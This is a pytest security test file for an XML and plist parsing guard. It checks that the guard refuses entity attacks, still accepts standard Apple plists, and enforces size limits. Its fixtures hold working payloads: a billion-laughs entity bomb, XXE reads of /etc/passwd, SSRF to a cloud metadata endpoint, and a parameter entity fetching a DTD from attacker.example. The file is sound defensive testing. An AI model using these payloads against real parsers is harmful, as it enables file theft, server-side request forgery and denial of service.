"""Security tests for XML and property-list parsing.

Both sit on expat, which will expand a nested entity bomb and — with the wrong
handler installed — resolve external entities. The guard has to refuse those
while still accepting the standard Apple plist DOCTYPE that appears on virtually
every XML plist in existence; getting that wrong in either direction is a defect.
"""

from __future__ import annotations

import plistlib
import time

import pytest

from masa.decompile.safexml import UnsafeXmlError, guard_xml_bytes, parse_plist, parse_xml
from masa.errors import DecompileError

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

XXE_FILE_READ = (
    b'<?xml version="1.0"?>'
    b'<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    b"<r>&xxe;</r>"
)

XXE_SSRF = (
    b'<?xml version="1.0"?>'
    b'<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
    b"<r>&xxe;</r>"
)

XXE_PARAMETER = (
    b'<?xml version="1.0"?>'
    b'<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker.example/evil.dtd"> %ext;]>'
    b"<r/>"
)

XXE_PLIST = (
    b'<?xml version="1.0" encoding="UTF-8"?>'
    b'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"'
    b' "http://www.apple.com/DTDs/PropertyList-1.0.dtd"'
    b' [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    b"<plist version=\"1.0\"><dict><key>k</key><string>&xxe;</string></dict></plist>"
)

ATTACKS = {
    "billion laughs": BILLION_LAUGHS,
    "XXE local file read": XXE_FILE_READ,
    "XXE SSRF to cloud metadata": XXE_SSRF,
    "XXE parameter entity": XXE_PARAMETER,
    "XXE inside an Apple plist DOCTYPE": XXE_PLIST,
}


class TestEntityAttacks:
    @pytest.mark.parametrize("name", list(ATTACKS))
    def test_xml_parser_refuses(self, name: str):
        with pytest.raises(UnsafeXmlError):
            parse_xml(ATTACKS[name])

    @pytest.mark.parametrize("name", list(ATTACKS))
    def test_plist_parser_refuses(self, name: str):
        with pytest.raises(UnsafeXmlError):
            parse_plist(ATTACKS[name])

    @pytest.mark.parametrize("name", list(ATTACKS))
    def test_refusal_is_immediate(self, name: str):
        """Refusal must happen before parsing, so the bomb never expands."""
        started = time.monotonic()
        with pytest.raises(UnsafeXmlError):
            parse_xml(ATTACKS[name])
        assert time.monotonic() - started < 1.0

    def test_no_file_content_leaks_through_a_refusal(self):
        try:
            parse_xml(XXE_FILE_READ)
        except UnsafeXmlError as exc:
            assert "root:" not in str(exc)
            assert "/etc/passwd" not in str(exc) or "SYSTEM" not in str(exc)


class TestLegitimateDocuments:
    def test_standard_apple_plist_doctype_is_accepted(self):
        """The common case: virtually every XML plist carries this DOCTYPE."""
        document = plistlib.dumps({"get-task-allow": True}, fmt=plistlib.FMT_XML)
        assert b"<!DOCTYPE plist PUBLIC" in document
        assert parse_plist(document) == {"get-task-allow": True}

    def test_binary_plist_is_accepted(self):
        document = plistlib.dumps({"a": [1, "two"]}, fmt=plistlib.FMT_BINARY)
        assert parse_plist(document) == {"a": [1, "two"]}

    def test_plain_xml_manifest_is_accepted(self):
        root = parse_xml(b'<manifest package="com.example"><application/></manifest>')
        assert root.get("package") == "com.example"

    def test_malformed_xml_raises_a_clean_error(self):
        with pytest.raises(DecompileError):
            parse_xml(b"<a><b></a>")

    def test_malformed_plist_raises_a_clean_error(self):
        with pytest.raises(DecompileError):
            parse_plist(b"<?xml version='1.0'?><plist><dict><key>x")


class TestSizeLimits:
    def test_oversized_xml_is_refused(self):
        from dataclasses import replace

        from masa.config import DEFAULT_LIMITS

        limits = replace(DEFAULT_LIMITS, max_xml_bytes=100)
        with pytest.raises(UnsafeXmlError, match="above the"):
            guard_xml_bytes(b"<a>" + b"x" * 500 + b"</a>", limits)

    def test_oversized_plist_is_refused(self):
        from dataclasses import replace

        from masa.config import DEFAULT_LIMITS

        limits = replace(DEFAULT_LIMITS, max_xml_bytes=50)
        document = plistlib.dumps({"k": "v" * 500}, fmt=plistlib.FMT_BINARY)
        with pytest.raises(UnsafeXmlError, match="above the"):
            parse_plist(document, limits)

    def test_deeply_nested_plist_does_not_blow_the_stack(self):
        payload: object = "leaf"
        for _ in range(400):
            payload = [payload]
        try:
            document = plistlib.dumps(payload, fmt=plistlib.FMT_BINARY)
        except (RecursionError, OverflowError):
            pytest.skip("the writer could not build a document this deep")
        try:
            parse_plist(document)
        except (UnsafeXmlError, DecompileError):
            pass  # refusing is the correct outcome
